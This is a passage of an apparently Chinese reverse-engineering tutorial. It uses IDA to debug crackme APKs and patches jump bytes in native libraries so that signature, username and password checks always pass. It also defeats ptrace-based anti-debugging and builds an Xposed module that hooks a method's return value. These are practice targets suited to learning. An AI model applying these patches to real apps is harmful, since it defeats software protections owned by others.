href="#9-IDA动态破解登录验证" class="headerlink" title="9. IDA动态破解登录验证"></a>9. IDA动态破解登录验证</h1><h2 id="9-1-预备知识与环境配置"><a href="#9-1-预备知识与环境配置" class="headerlink" title="9.1 预备知识与环境配置"></a>9.1 预备知识与环境配置</h2><p>jeb工具的使用 <a href="https://www.52pojie.cn/thread-742250-1-1.html">https://www.52pojie.cn/thread-742250-1-1.html</a></p><p>我觉得jeb就是AK+AS，可以看看，如果熟悉AK和AS，jeb很容易上手。jeb的优点是反编译回Java的可读性比AK强。</p><p>Android逆向必会命令 <a href="https://www.52pojie.cn/thread-742284-1-1.html">https://www.52pojie.cn/thread-742284-1-1.html</a></p><p>连手机和连模拟器是一模一样的命令，不需要担心。</p><p>so文件如果是arm架构的，用x86架构的雷电模拟器可能会出问题，所以最好用真机或安卓原生模拟器或Genymotion调试。真机需要root权限，否则IDA在附加上程序时出现不了包名。但小米手机不是默认root，搞个root权限要花很长时间。原生模拟器也太卡了…但卡归卡，调试时还是很友好的。Genymotion会出现各种各样的问题，我佛了。</p><p>Genymotion安装及ARM支持 <a href="https://blog.csdn.net/fidelhl/article/details/85239238">https://blog.csdn.net/fidelhl/article/details/85239238</a> </p><p>Genymotion-ARM-Translation  <a href="https://www.jianshu.com/p/97b8250f359e">https://www.jianshu.com/p/97b8250f359e</a> </p><p>adb devices检测不到genymotion模拟器 <a href="https://blog.csdn.net/qq_15158911/article/details/75304011">https://blog.csdn.net/qq_15158911/article/details/75304011</a> </p><p>关闭端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;netstat -ano | findstr 23946</span><br><span class="line">  TCP    127.0.0.1:23946        0.0.0.0:0              LISTENING       13752</span><br><span class="line"></span><br><span class="line">C:\Users\dell&gt;taskkill -pid 13752 -f</span><br><span class="line">成功: 已终止 PID 为 13752 的进程。</span><br></pre></td></tr></table></figure><h2 id="9-2-动态破解登录验证"><a href="#9-2-动态破解登录验证" class="headerlink" title="9.2 动态破解登录验证"></a>9.2 动态破解登录验证</h2><p>拿到一个<code>.apk</code>程序，先在模拟器上安装，运行一下熟悉流程。程序与第8节的几乎一样，但第8节的程序没有<code>android:debuggable=&quot;true&quot;</code>。</p><p>将<code>.apk</code>文件用AK打开，因为需要调试，所以必须保证<code>application</code>标签里的<code>android:debuggable=&quot;true&quot;</code>。</p><img src="/posts/15be101a/debug.png" class="" title="android:debuggable&#x3D;true"><p>找到MainActivity入口类，并反编译成java代码。通过静态分析java代码可知，用户在输入用户名和密码后程序会调用Native方法check。</p><img src="/posts/15be101a/13.png" class="" title="MainActivity"><img src="/posts/15be101a/14.png" class="" title="jni"><p>解包将<code>libJniTest.so</code>载入IDA分析check方法的具体实现。这个程序有3个lib，具体分析哪个<code>libJniTest.so</code>，看模拟器或真机默认使用哪个so。Genymotion虽然安装了arm架构，但如果有<code>x86</code>的so文件它还是使用<code>x86</code>目录下的。真机是arm架构的，用<code>armeabi-v7a</code>或<code>armeabi</code>都没问题，但修改完后要把两个目录下的so文件都替换成新的。</p><p>将x86目录下的so文件载入IDA，几乎与armeabi目录下的差不多，但汇编代码是我们熟悉的PC逆向，感觉来了！</p><img src="/posts/15be101a/9.2.8.png" class="" title="IDA反编译"><img src="/posts/15be101a/9.2.9.png" class="" title="汇编代码"><p>开始动态调试。将<code>IDA_Pro_7.5\dbgsrv</code>目录下的<code>android_x86_server</code> push 到模拟器<code>/data/local/tmp/</code>目录下，给777权限并运行<code>android_x86_server</code>。注意，真机 push <code>android_server</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;adb push D:\CTF\tools\IDA_Pro_v7.5\dbgsrv\android_x86_server /data/local/tmp</span><br><span class="line">D:\CTF\tools\IDA_Pro_v7.5\dbgsrv\android_x86_server: 1 file pushed, 0 skipped. 693.5 MB/s (1130104 bytes in 0.002s)</span><br><span class="line"></span><br><span class="line">C:\Users\dell&gt;adb shell</span><br><span class="line">vbox86p:/ # cd /data/local/tmp</span><br><span class="line">vbox86p:/data/local/tmp # ls -al</span><br><span class="line">total 1900</span><br><span class="line">drwxrwx--x 2 shell shell    4096 2022-03-08 19:53 .</span><br><span class="line">drwxr-x--x 3 root  root     4096 2022-03-07 00:13 ..</span><br><span class="line">-rwxrwxrwx 1 root  root   786868 2020-12-31 11:00 android_server</span><br><span class="line">-rw-rw-rw- 1 root  root  1130104 2020-12-31 11:00 android_x86_server</span><br><span class="line">vbox86p:/data/local/tmp # chmod 777 android_x86_server</span><br><span class="line">vbox86p:/data/local/tmp # ./android_x86_server</span><br><span class="line">IDA Android x86 32-bit remote debug server(ST) v7.5.26. Hex-Rays (c) 2004-2020</span><br><span class="line">Listening on 0.0.0.0:23946...</span><br></pre></td></tr></table></figure><p>新开一个cmd，执行端口转发命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;adb forward tcp:23946 tcp:23946</span><br><span class="line">23946</span><br></pre></td></tr></table></figure><p>模拟器运行该程序，回到刚才打开的IDA，确保已经载入主机该程序的so文件，且与模拟器使用的so文件一致。Debugger -&gt; Select debugger 。选择Linux debugger。</p><img src="/posts/15be101a/9.2.10.png" class="" title="Linux debugger"><p>Debugger -&gt; Process options ，确认端口号。</p><img src="/posts/15be101a/9.2.11.png" class="" title="Linux 确认端口号"><p>Debugger -&gt; Attach to process ，找到我们需要附加的包名。</p><img src="/posts/15be101a/9.2.12.png" class="" title="Linux 附加包名"><p>确认so文件是否一致。</p><img src="/posts/15be101a/9.2.13.png" class="" title="so文件一致"><p>等它加载，在某个地方停下来，此时，EIP指向停止处。</p><img src="/posts/15be101a/9.2.14.png" class="" title="载入界面"><p>Ctrl + S找so文件，找到有执行权限且最开始的so文件。</p><img src="/posts/15be101a/9.2.15.png" class="" title="有执行权限的so文件"><p>或在Modules窗口找so文件，在so文件里找check方法。</p><img src="/posts/15be101a/9.2.16.png" class="" title="汇编代码"><p>也可以F5查看伪代码，根据伪代码在汇编代码中找到几个跳转语句下断。</p><img src="/posts/15be101a/9.2.17.png" class="" title="下断"><p>F9运行程序，输入用户名555和密码3333，点击登录，IDA停在第一个断点处。因为我们没有重新编译签名，所以签名是一致的，不跳转，继续往下执行。</p><img src="/posts/15be101a/9.2.18.png" class="" title="第一个断点处"><p>F8往下执行或F9来到下个断点处，可以看到寄存器窗口ESI指向我们输入的用户名，EDI指向真正的用户名，将两个进行对比，由于不一致，所以跳转实现。第三个断点一样，不再赘述。</p><img src="/posts/15be101a/9.2.19.png" class="" title="第二个断点处"><p>接下来修改，因为我们修改完so文件，要重新编译打包签名，所以签名校验一定要绕过，用户名和密码也要爆破，所以总共要修改三处跳转。</p><p><code>jz</code>的机器码为74，<code>jnz</code>的机器码为75。选中要修改的字节，Edit -&gt; Patch program -&gt; Change Byte 。</p><img src="/posts/15be101a/9.2.20.png" class="" title="修改程序"><p>Edit -&gt; Patch program -&gt; Apply patches to input file ，保存so文件。重打包，在AK中签名。模拟器安装程序，验证，登录成功。</p><img src="/posts/15be101a/9.2.21.png" class="" title="运行成功"><p>注意，我们只修改了x86目录下的so文件，如果想要程序在所有架构都能“登录成功”，必须要修改它所有拥有的so文件。</p><h1 id="10-动态调试反调试apk"><a href="#10-动态调试反调试apk" class="headerlink" title="10. 动态调试反调试apk"></a>10. 动态调试反调试apk</h1><h2 id="10-1-反调试及反反调试"><a href="#10-1-反调试及反反调试" class="headerlink" title="10.1 反调试及反反调试"></a>10.1 反调试及反反调试</h2><h3 id="10-1-1-IDA调试端口检测"><a href="#10-1-1-IDA调试端口检测" class="headerlink" title="10.1.1 IDA调试端口检测"></a>10.1.1 IDA调试端口检测</h3><p>原理：调试器远程调试时，会占用一些固定的端口号，如23946。</p><p>解决方法：修改调试端口号。端口号范围从0到65535，0不使用，1到1023为BSD保留端口，也是系统端口，1024到5000是BSD临时端口，5001到65535为用户自定义端口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./android_server -p6666</span><br></pre></td></tr></table></figure><h3 id="10-1-2-调试器进程名检测"><a href="#10-1-2-调试器进程名检测" class="headerlink" title="10.1.2 调试器进程名检测"></a>10.1.2 调试器进程名检测</h3><p>原理：远程调试要在手机中运行<code>android_server</code>、<code>gdbserver</code>、<code>gdb</code>等进程。</p><p>解决方法：修改调试器server名字。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename android_server heiboy</span><br></pre></td></tr></table></figure><h3 id="10-1-3-ptrace检测"><a href="#10-1-3-ptrace检测" class="headerlink" title="10.1.3 ptrace检测"></a>10.1.3 ptrace检测</h3><p>原理：一个进程只能被ptrace一次，可以自己ptrace自己，如果被调试器ptrace了，自己ptrace肯定ptrace不了，根据返回值进行判断。</p><p>解决方法：</p><ol><li>修改系统源码，让ptrace返回值恒为0</li><li>hook ptrace</li></ol><h2 id="10-2-反反调试apk"><a href="#10-2-反反调试apk" class="headerlink" title="10.2 反反调试apk"></a>10.2 反反调试apk</h2><p>拿到一个<code>.apk</code>程序，先在AS原生模拟器上安装，运行一下熟悉流程。如果只有arm架构so文件的最好用AS原生模拟器，因为genymotion即使支持arm架构还是调试不了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install AliCrackme_2_killer.apk</span><br></pre></td></tr></table></figure><img src="/posts/15be101a/9.2.1.png" class="" title="运行程序"><p>将<code>.apk</code>文件用AK打开，因为需要调试，所以必须保证<code>application</code>标签里有<code>android:debuggable=&quot;true&quot;</code>。如果没有必须加上，重新编译打包，卸载模拟器里的程序，重新安装。</p><img src="/posts/15be101a/10.1.png" class="" title="android:debuggable&#x3D;true"><p>找到MainActivity入口类，并反编译成java代码。通过静态分析java代码可知，程序调用了Native方法<code>securityCheck</code>，且放在了<code>libcrackme.so</code>文件中。</p><img src="/posts/15be101a/jni.png" class="" title="MainActivityjava代码"><p>解包发现只有<code>armeabi</code>目录的<code>libcrackme.so</code>，载入IDA分析<code>securityCheck</code>方法的具体实现，伪代码和汇编代码配合使用。</p><img src="/posts/15be101a/10.2.png" class="" title="汇编代码"><img src="/posts/15be101a/9.2.2.png" class="" title="伪代码分析"><p>盲猜 v5 == v3，但很遗憾，失败了，所以v3一定是经过某种转换才等于“wojiushidaan”。选中v5后面的v3右键-&gt;Set Ivar Type，通过<code>JNIEnv*</code>还原类似((_DWORD )v3 + 676))格式的指令。</p><img src="/posts/15be101a/9.2.3.png" class="" title="JNIEnv*"><img src="/posts/15be101a/9.2.4.png" class="" title="GetStringUTFChars"><p>要想知道怎么变换，需要动态调试<code>libcrackme.so</code>文件。</p><p>打开cmd，将<code>IDA_Pro_v7.5\dbgsrv</code>目录下的<code>android_server</code> push 到模拟器<code>/data/local/tmp/</code>目录下，给777权限并运行<code>android_server</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;adb push D:\CTF\tools\IDA_Pro_v7.5\dbgsrv\android_server /data/local/tmp</span><br><span class="line">D:\CTF\tools\IDA_Pro_v7.5\dbgsrv\android_server: 1 file pushed, 0 skipped. 494.3 MB/s (589588 bytes in 0.001s)</span><br><span class="line"></span><br><span class="line">C:\Users\dell&gt;adb shell</span><br><span class="line">vbox86p:/ # cd /data/local/tmp</span><br><span class="line">vbox86p:/data/local/tmp # ls -al</span><br><span class="line">total 596</span><br><span class="line">drwxrwx--x 2 shell shell   4096 2022-03-07 09:01 .</span><br><span class="line">drwxr-x--x 3 root  root    4096 2022-03-07 00:13 ..</span><br><span class="line">-rw-rw-rw- 1 root  root  589588 2017-09-14 03:08 android_server</span><br><span class="line">vbox86p:/data/local/tmp # chmod 777 android_server</span><br><span class="line">vbox86p:/data/local/tmp # ./android_server</span><br><span class="line">IDA Android 32-bit remote debug server(ST) v1.22. Hex-Rays (c) 2004-2017</span><br><span class="line">Listening on 0.0.0.0:23946...</span><br></pre></td></tr></table></figure><p>新开一个cmd，执行端口转发命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;adb forward tcp:23946 tcp:23946</span><br><span class="line">23946</span><br></pre></td></tr></table></figure><p>按照第9节的照做一遍，PC指向程序停止处。 Ctrl + S 找到有执行权限的<code>libcrackme.so</code>，在Modules窗口找到的<code>securityCheck</code>函数的图形化界面竟然没有显示“wojiushidaan”，而是“aiyou,bucuoo”。</p><img src="/posts/15be101a/10.3.png" class="" title="汇编代码"><p>回到汇编代码再函数起始处下断，F9运行，程序直接退出。说明程序有反调试功能。</p><img src="/posts/15be101a/10.7.png" class="" title="下断点"><p>先不管那么多，输入“aiyou,bucuoo”试试，成功了！</p><img src="/posts/15be101a/10.4.png" class="" title="输入校验码"><p>好啦好啦你肯定又跟我说我学的是破解！回归正题，反调试的基本原理是这样的：IDA使用android_server在root环境下注入到被调试的进程中，用到的技术是Linux中的ptrace，当Android中的一个进程被另外一个进程ptrace之后，在其status文件中有一个字段TracerPid可以标识是被哪一个进程trace了(Linux中的/proc/pid/status文件)。这里有两个地方是so动态加载完毕前执行的，<code>.init_array</code>是一个so最先加载的一个段信息，时机最早，现在一般so解密操作都是在这里做的；<code>JNI_OnLoad</code>是so被System.loadLibrary调用的时候执行的，它的时机早于native方法的执行。</p><p>反调试机制很可能在<code>JNI_Onload</code>处就让程序退出的，所以我们得先去掉反调试机制，才能继续进行破解。那如何断在<code>JNI_OnLoad</code>函数指令处呢？Debugger -&gt; Debugger options -&gt; 勾选下面三个选项。</p><img src="/posts/15be101a/%E4%B8%89%E9%80%89%E9%A1%B9.png" class="" title="三个选项"><p>这三个选项意味着：</p><ul><li>第一个：在APK程序入口处停止。</li><li>第二个：有线程启动运行或者退出时，暂停。</li><li>第三个：当动态库（apk中的so文件）加载或者取消加载时，暂停。</li></ul><p>但是由于被调试程序一运行就会执行static中的语句，因此需要让程序停在加载so文件之前，故可以使用debug方式来启动：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;adb shell am start -D -n com.yaotong.crackme/.MainActivity</span><br><span class="line">Starting: Intent &#123; cmp=com.yaotong.crackme/.MainActivity &#125;</span><br></pre></td></tr></table></figure><p>在载入so文件的IDA下点击 Debugger -&gt; Attach to process ，找到我们需要附加的包名。等它加载到PC停止。</p><p>此时，so文件还没有被加载到内存中去，所以还要让程序跑起来。启动 DDMS（进入sdk安装目录<code>\sdk\tools</code>下，运行<code>monitor.bat</code>脚本启动），在DDMS上选择相应进程后，使用指令使apk继续运行，成功后，DDMS上进程将显示绿色，否则是红色。</p><img src="/posts/15be101a/DDMS.png" class="" title="在DDMS上选择相应进程"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;jdb -connect com.sun.jdi.SocketAttach:port=8700,hostname=localhost</span><br><span class="line">设置未捕获的java.lang.Throwable</span><br><span class="line">设置延迟的未捕获的java.lang.Throwable</span><br><span class="line">正在初始化jdb...</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><img src="/posts/15be101a/DDMS2.png" class="" title="显示绿色"><p>如果在DDMS中找不到相应进程，点一下重置adb，再选中目标进程，输入命令。</p><img src="/posts/15be101a/reset.jpg" class="" title="重置adb"><p>点击运行几次，直至弹窗。</p><img src="/posts/15be101a/10.6.png" class="" title="弹窗"><p>Ctrl + S 看到有执行权限的<code>libcrackme.so</code>文件，在Modulus窗口找到<code>libcrackme.so</code>中的<code>JNI_Oload</code>函数，在函数起始处下断，F9运行。</p><img src="/posts/15be101a/10.6.jpg" class="" title="下断运行"><p>然后F8步过，来到此位置。经多次调试，运行到<code>BLX R7</code>时会跳到另一段代码处。这段代码的用途是创建线程。</p><img src="/posts/15be101a/10.8.jpg" class="" title="创建线程"><p>为什么要在<code>JNI_Oload</code>里创建线程呢？很有可能是ptrace检测。<code>thread_create</code>函数在<code>init_array</code>段里，这个函数创建了一个线程循环来读取<code>/proc/pid/status</code>文件下的TracePid的值，如果大于0说明程序正在被调试，退出程序。直接nop掉这行代码试试。arm的<code>ANDEQ R0</code>对应x86的<code>nop</code>，机器码为<code>00 00</code>。</p><img src="/posts/15be101a/10.9.png" class="" title="nop掉创建线程"><p>保存，重打包，签名。现在用第9节的方法再试一遍，看是否能在<code>libcrackme.so</code>中的<code>securityCheck</code>方法中断下来。先下断点，再在app中输入密码，点击按钮，IDA成功停在断点处。</p><img src="/posts/15be101a/10.10.png" class="" title="停在断点处"><p>接下来如何破解？F8步过，运行到此处，查看R0寄存器，存的是输入的“555”。</p><img src="/posts/15be101a/10.11.png" class="" title="R0寄存器"><img src="/posts/15be101a/10.12.png" class="" title="代码分析"><p>如果要使输入任何都成功，则需要修改循环里的两个跳转语句。呃不知道为什么这里BNE的机器码不是<code>D1</code>，所以只能全都改为nop语句也是可以的。</p><img src="/posts/15be101a/10.13.png" class="" title="BNE"><img src="/posts/15be101a/10.14.png" class="" title="nop"><p>卸载模拟器中旧的app：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb uninstall com.yaotong.crackme</span><br></pre></td></tr></table></figure><p>安装新的，运行。无论输入什么都会跳转到成功页面。</p><img src="/posts/15be101a/10.15.png" class="" title="成功"><h1 id="11-编写Xposed模块"><a href="#11-编写Xposed模块" class="headerlink" title="11. 编写Xposed模块"></a>11. 编写Xposed模块</h1><p>Xpose是一款特殊的安卓应用，诞生于著名的XDA论坛，它的原理是替换安卓系统<code>/system/bin</code>目录下的app_process来控制zygote进程，使得app_pross在启动时会加载<code>XposedBridge.jar</code>，从而实现对zygode进程以及其创建的虚拟机的劫持，最终对系统的某些功能实现接管。</p><p>优点：Xpose可以在我们不破坏apk自身的情况下实现对函数的hook，修改函数的参数和返回值，改变函数的结构并执行我们自己的代码，用好了Xposed可以对我们的逆向过程起到事半功倍的作用。</p><p>缺点：本身不能对so中的函数进行修改，需要结合其他框架。 </p><p>在模拟器上安装Xposed框架 <a href="https://blog.csdn.net/weixin_48140105/article/details/118359568">https://blog.csdn.net/weixin_48140105/article/details/118359568</a> </p><p>编写一个Xposed模块，也就是开发一个安卓app。和普通程序本质上是一样的，不一样的点在于：</p><ul><li>让EdXposed知道我们安装的这个程序是个Xposed模块。</li><li>模块里要包含有Xposed的API的jar包，以实现下一步的hook操作。</li><li>这个模块里面要有对目标程序进行hook操作的方法。</li><li>要让手机上的Xposed框架知道，我们编写的Xposed模块中，哪一个方法是实现hook操作的，也就是hook类的入口。</li></ul><p>先在AS中创建一个Empty Activity项目，在界面创建一个按钮，实现某种功能。</p><img src="/posts/15be101a/11.8.png" class="" title="增加按钮"><p>在<code>MainActivity.java</code>中编写实现按钮功能代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposemk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Button mBtn;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        mBtn = (Button) findViewById(R.id.btn);</span><br><span class="line">        mBtn.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>, message(), Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">message</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;红红火火恍恍惚惚&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>连接好模拟器，安装app运行。</p><img src="/posts/15be101a/11.9.png" class="" title="正常运行"><p>现在通过编写一个Xposed模块修改按钮被点击后显示的弹框信息。</p><p>下载XposedBridgeAPI模块 <a href="https://github.com/924587628/XposedBridgeAPI">https://github.com/924587628/XposedBridgeAPI</a> ，将下载的API拖进libs文件夹。</p><img src="/posts/15be101a/11.2.png" class="" title="拖进libs文件夹"><p>右击jar包 -&gt; Add As Library -&gt; OK。</p><p>app -&gt; src -&gt; main -&gt; AndroidManifest.xml ，在<code>application</code>标签中加入Xpose配置信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta-data</span><br><span class="line">        android:name=&quot;xposedmodule&quot;</span><br><span class="line">        android:value=&quot;true&quot; /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">        android:name=&quot;xposeddescription&quot;</span><br><span class="line">        android:value=&quot;Easy example&quot; /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">        android:name=&quot;xposedminversion&quot;</span><br><span class="line">        android:value=&quot;89&quot; /&gt;</span><br></pre></td></tr></table></figure><img src="/posts/15be101a/11.3.png" class="" title="Xposed"><p>app -&gt; build.gradle，在dependencies段里修改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    ...</span><br><span class="line">    compileOnly files(&#x27;libs\\XposedBridgeAPI-89.jar&#x27;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/15be101a/11.4.png" class="" title="compileOnly"><p>在<code>MainActivity.java</code>同目录里新建一个<code>hook.java</code>，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposemk;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        <span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;com.example.xposemk&quot;</span>))&#123;</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;hooking...&quot;</span>);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> loadPackageParam.classLoader.loadClass(<span class="string">&quot;com.example.xposemk.MainActivity&quot;</span>);</span><br><span class="line">            XposedHelpers.findAndHookMethod(cls, <span class="string">&quot;message&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>()&#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">                    <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> param.getResult();</span><br><span class="line">                    XposedBridge.log(obj.toString());</span><br><span class="line">                    param.setResult(<span class="string">&quot;biubiubiu&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>右击main，New -&gt; Folder -&gt; Assets Folder。main -&gt; assets 右键 -&gt; New -&gt; file ，新建<code>xposed_init</code>文件，将内容编辑为包名+类名。</p><img src="/posts/15be101a/11.6.png" class="" title="Xposed_init文件"><img src="/posts/15be101a/11.7.png" class="" title="包名+类名"><p>模拟器卸载原本的app，重新安装。打开Xposed Installer，在模块栏勾选对应进程。</p><img src="/posts/15be101a/11.11.png" class="" title="Xposed Installer勾选对应进程"><p>重启模拟器，运行app，发现显示的弹框信息已被修改。</p><img src="/posts/15be101a/11.10.png" class="" title="弹框信息已被修改"><h1 id="12-Xpose实战"><a href="#12-Xpose实战" class="headerlink" title="12. Xpose实战"></a>12. Xpose实战</h1><p>hook一个函数需要知道以下三点：<br>(1)方法的包名+类名<br>(2)方法名<br>(3)方法的参数类型 </p><img src="/posts/15be101a/12.1.png" class="" title="解锁失败"><p>用jeb打开apk，查看<code>MainActivity</code>反编译的源码。</p><img src="/posts/15be101a/12.2.png" class="" title="查看源码"><p>发现有好多a，这里应该是做了简单混淆。那就一个个来看吧。</p><img src="/posts/15be101a/12.3.png" class="" title="简单混淆"><p><code>com.hfdcxy.android.by.a</code>包中有一个类a，其中有一个方法a和一个属性a。<code>a.a.a</code>的作用是输出Log语句。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.hfdcxy.android.by.a;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">a</span> &#123;<span class="comment">//类a</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span 